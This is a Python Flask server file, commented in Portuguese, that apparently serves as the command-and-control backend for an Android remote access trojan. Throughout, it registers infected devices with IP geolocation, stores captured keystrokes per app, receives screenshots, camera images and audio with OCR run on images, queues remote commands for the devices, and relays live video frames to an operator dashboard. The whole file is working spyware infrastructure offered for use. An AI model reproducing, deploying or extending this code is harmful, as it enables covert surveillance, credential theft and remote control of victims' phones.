# language: Python 3.11, file: server.py
# pip install flask flask-cors flask-socketio gevent gevent-websocket requests pytesseract pillow

import sqlite3
import json
import os
import base64
import io
import requests
from datetime import datetime
from PIL import Image
import pytesseract
from flask import Flask, request, jsonify, render_template, g
from flask_cors import CORS
from flask_socketio import SocketIO, emit

app = Flask(__name__, template_folder='.', static_folder='.')
app.config['SECRET_KEY'] = 'nexus_dark_ops_secret'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

DATABASE = 'c2.db'
os.makedirs('uploads', exist_ok=True)

# --- BANCO DE DADOS ---

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.executescript('''
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY, model TEXT, android_version TEXT, last_seen TEXT,
                status TEXT DEFAULT 'online', battery TEXT DEFAULT '?', 
                ip TEXT, city TEXT, isp TEXT, is_rooted BOOLEAN DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, 
                status TEXT DEFAULT 'pending', timestamp TEXT
            );
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, 
                app_name TEXT, content TEXT, timestamp TEXT
            );
            CREATE TABLE IF NOT EXISTS media (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, 
                filename TEXT, file_type TEXT, ocr_text TEXT, timestamp TEXT
            );
        ''')
        db.commit()

# --- API (RAT -> SERVIDOR) ---

@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    device_id = data.get('id')
    ip = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # GeoIP via ip-api (Gratuito)
    city, isp = "Desconhecido", "Desconhecido"
    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}').json()
        if geo['status'] == 'success':
            city = f"{geo['city']}, {geo['regionName']}"
            isp = geo['isp']
    except: pass

    db = get_db()
    db.execute('''
        INSERT INTO devices (id, model, android_version, last_seen, status, battery, ip, city, isp, is_rooted)
        VALUES (?, ?, ?, ?, 'online', ?, ?, ?, ?, ?)
        ON CONFLICT(id) DO UPDATE SET 
            last_seen=excluded.last_seen, status='online', battery=excluded.battery, ip=excluded.ip
    ''', (device_id, data.get('model'), data.get('android'), now, data.get('battery'), ip, city, isp, data.get('rooted', False)))
    db.commit()
    
    # Emite evento WebSocket para o painel atualizar na hora
    socketio.emit('device_update', {"id": device_id, "status": "online", "battery": data.get('battery')})
    return jsonify({"status": "ok"})

@app.route('/api/keylog', methods=['POST'])
def keylog():
    data = request.json
    db = get_db()
    db.execute('INSERT INTO keylogs (device_id, app_name, content, timestamp) VALUES (?, ?, ?, ?)',
               (data.get('id'), data.get('app'), data.get('text'), datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    db.commit()
    socketio.emit('new_keylog', {"id": data.get('id'), "app": data.get('app'), "text": data.get('text')})
    return jsonify({"status": "ok"})

@app.route('/api/media', methods=['POST'])
def media():
    data = request.json
    device_id = data.get('id')
    file_b64 = data.get('file')
    file_type = data.get('type') # 'screenshot', 'camera', 'audio'
    
    ext = 'jpg' if file_type in ['screenshot', 'camera'] else 'mp3'
    filename = f"{device_id}_{int(datetime.now().timestamp())}.{ext}"
    filepath = os.path.join('uploads', filename)
    
    ocr_text = ""
    try:
        raw_data = base64.b64decode(file_b64)
        with open(filepath, "wb") as f:
            f.write(raw_data)
            
        # OCR (se for imagem)
        if ext == 'jpg':
            img = Image.open(io.BytesIO(raw_data))
            ocr_text = pytesseract.image_to_string(img)
            
        db = get_db()
        db.execute('INSERT INTO media (device_id, filename, file_type, ocr_text, timestamp) VALUES (?, ?, ?, ?, ?)',
                   (device_id, filename, file_type, ocr_text, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        db.commit()
        socketio.emit('new_media', {"id": device_id, "type": file_type, "filename": filename})
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/command/<device_id>', methods=['GET'])
def get_command(device_id):
    db = get_db()
    cmd = db.execute('SELECT * FROM commands WHERE device_id = ? AND status = "pending" LIMIT 1', (device_id,)).fetchone()
    if cmd:
        db.execute('UPDATE commands SET status = "sent" WHERE id = ?', (cmd['id'],))
        db.commit()
        return jsonify({"command": cmd['command']})
    return jsonify({"command": None})

# --- ROTAS DE CONTROLE (PAINEL -> SERVIDOR) ---

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    db = get_db()
    db.execute('INSERT INTO commands (device_id, command, timestamp) VALUES (?, ?, ?)',
               (data['device_id'], data['command'], datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    db.commit()
    return jsonify({"status": "ok"})

@app.route('/api/stream', methods=['POST'])
def receive_stream():
    # Recebe frames de vídeo via POST rápido para contornar limites do WebSocket na entrada
    data = request.json
    socketio.emit('video_frame', {"id": data.get('id'), "frame": data.get('frame'), "type": data.get('type')})
    return jsonify({"status": "ok"})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/dashboard', methods=['GET'])
def dashboard():
    db = get_db()
    devices = db.execute('SELECT * FROM devices ORDER BY last_seen DESC').fetchall()
    keylogs = db.execute('SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT 50').fetchall()
    media = db.execute('SELECT * FROM media ORDER BY timestamp DESC LIMIT 20').fetchall()
    
    return jsonify({
        "devices": [dict(ix) for ix in devices],
        "keylogs": [dict(ix) for ix in keylogs],
        "media": [dict(ix) for ix in media]
    })

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='0.0.0.0', port=5000)